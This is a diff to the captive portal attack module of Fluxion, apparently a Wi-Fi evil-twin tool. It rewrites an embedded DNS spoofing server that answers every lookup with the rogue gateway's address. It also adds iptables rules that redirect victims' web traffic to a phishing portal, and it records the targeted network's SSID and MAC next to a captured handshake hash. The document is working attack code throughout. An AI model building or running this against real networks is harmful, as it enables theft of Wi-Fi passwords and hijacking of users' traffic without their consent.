@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 # ============================================================ #
 # =============== < Captive Portal Parameters > ============== #
@@ -744,54 +744,87 @@ index-file.names = (
 
   # Create a DNS service with python, forwarding all traffic to gateway.
   echo "\
-#!/usr/bin/env python2
-# -*- coding: utf-8 -*-
-
-import socket
-
+import sys, traceback, socket
+# NOTICE: This DNS server works with python 2 and python 3
 
 class DNSQuery:
-    def __init__(self, data):
-        self.data=data
-        self.dominio=''
+  def __init__(self, data):
+    self.data = data
+    self.domain = ''
 
-        tipo = (ord(data[2]) >> 3) & 15
-        if tipo == 0:
-            ini=12
-            lon=ord(data[ini])
-            while lon != 0:
-                self.dominio+=data[ini + 1:ini + lon + 1] + '.'
-                ini += lon + 1
-                lon=ord(data[ini])
+    queryType = (ord(data[2]) >> 3) & 15
 
-    def respuesta(self, ip):
-        packet=''
-        if self.dominio:
-            packet+=self.data[:2] + '\x81\x80'
-            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-            packet+=self.data[12:]
-            packet+='\xc0\x0c'
-            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-            packet+=str.join('', map(lambda x: chr(int(x)), ip.split('.')))
-        return packet
+    # Only handle basic requests.
+    if queryType != 0:
+      print('Ignoring Query: Non-spoofed type.')
+      return
 
+    domainStart = 13 # Skip length byte and start at domain.
+    domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
+
+    while domainLength != 0:
+      self.domain += data[domainStart : domainStart + domainLength] + '.'
+
+      domainStart += domainLength + 1 # Skip the length byte & start at domain.
+      domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
+
+  def response(self, ipv4):
+    if not self.domain: return ''
+
+    packet = ''
+
+    packet += self.data[ :2] + '\x81\x80'
+    packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
+    packet += self.data[12:]
+    packet += '\xc0\x0c'
+    packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+
+    # Convert string IPv4 quads to binary values (bytes).
+    packet += str.join('', map(lambda s: chr(int(s)), ipv4.split('.')))
+
+    return packet
 
 if __name__ == '__main__':
-    ip='$CaptivePortalGatewayAddress'
-    print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
+  targetIPv4 = '$CaptivePortalGatewayAddress'
 
-    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udps.bind((ip, 53))
+  print('Mini DNS Spoofer:: dom.query. 60 IN A %s' % targetIPv4)
 
-    try:
-        while True:
-            data, addr = udps.recvfrom(1024)
-            p=DNSQuery(data)
-            udps.sendto(p.respuesta(ip), addr)
-            print 'Request: %s -> %s' % (p.dominio, ip)
-    except KeyboardInterrupt:
-        print 'Finalizando'
-    udps.close()\
+  link = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  link.bind(('',53))
+
+  try:
+    while True:
+      clientData, clientIPv4 = link.recvfrom(1024)
+
+      queryData = clientData if sys.version_info < (3, 0) else clientData.decode('unicode_escape')
+
+      query = DNSQuery(queryData)
+
+      response = query.response(targetIPv4)
+
+      if sys.version_info > (3, 0):
+        # Someone that knows more about python and how it does byte-handling,
+        # please fix the following shitfest and make it a bit more elegant.
+        # Do what? A raw conversion of the \"response\" string to bytes.
+        responseHex = ''
+        for xx in response:
+          responseHex += \"%x%x\" % ((ord(xx) >> 4) & 0b1111, ord(xx) & 0b1111)
+
+        response = bytearray.fromhex(responseHex)
+
+      link.sendto(response, clientIPv4)
+
+      print('Request: %s -> %s' % (query.domain, targetIPv4))
+
+  except KeyboardInterrupt:
+    print('INTERRUPT: Stopping.')
+    link.close()
+
+  except Exception as error:
+    print('EXCEPTION: Stopping!')
+    print(error)
+    print(traceback.format_exc())
+    link.close()
 " >"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
   chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
@@ -799,7 +832,7 @@ if __name__ == '__main__':
   local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
   # Attack arbiter script
   echo "\
-#!/bin/bash
+#!/usr/bin/env bash
 
 signal_stop_attack() {
 	kill -s SIGABRT $$ # Signal STOP ATTACK
@@ -1128,7 +1161,8 @@ captive_portal_unset_routes() {
   ip addr del $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface 2>/dev/null
 }
 
-# Set up DHCP / WEB server / DNS Firewall
+# Set up DHCP / WEB server
+# Set up DHCP / WEB server
 captive_portal_set_routes() {
   # Give an address to the gateway interface in the rogue network.
   # This makes the interface accessible from the rogue network.
@@ -1144,10 +1178,15 @@ captive_portal_set_routes() {
   iptables --table nat --flush
   iptables --delete-chain
   iptables --table nat --delete-chain
-  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
-  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-  iptables -A INPUT -p udp --dport 53 -j ACCEPT
-  iptables -A INPUT -p udp --dport 67 -j ACCEPT
+  iptables -P FORWARD ACCEPT
+
+  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:80
+  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:443
+  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
+  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+  iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
 captive_portal_stop_interface() {
@@ -1300,6 +1339,18 @@ load_attack() {
 
   # Hash authenticator mode configuration.
   CaptivePortalHashPath=${configuration[7]}
+
+  # Target hash information for verification.
+  local -r targetHashSSID=${configuration[8]}
+  local -r targetHashMAC=${configuration[9]}
+
+  # Assure hash is relevant for fluxion's current target.
+  # If the hash is no longer relevant, clear to force reset.
+  if [ \
+    "$targetHashSSID" != "$FluxionTargetSSID" -o \
+    "$targetHashMAC" != "$FluxionTargetMAC" ]; then
+    CaptivePortalHashPath=""
+  fi
 }
 
 save_attack() {
@@ -1317,6 +1368,10 @@ save_attack() {
 
   # Hash authenticator mode configuration.
   echo "$CaptivePortalHashPath" >> "$configurationPath"
+
+  # Target to verify validity of hash on restore.
+  echo "$FluxionTargetSSID" >> "$configurationPath"
+  echo "$FluxionTargetMAC" >> "$configurationPath"
 }
 
 stop_attack() {
